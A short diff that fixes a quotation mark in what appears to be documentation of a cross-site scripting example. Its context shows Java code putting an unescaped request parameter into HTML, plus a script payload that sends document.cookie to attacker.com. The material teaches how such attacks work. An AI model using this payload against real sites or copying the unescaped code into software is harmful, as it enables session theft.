@@ -35,7 +35,7 @@ The application uses untrusted data in the construction of the following HTML sn
 
 `(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
 
-The attacker manipulates the ‘CC' parameter in his browser to:
+The attacker manipulates the 'CC' parameter in his browser to:
 
 `'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`
 
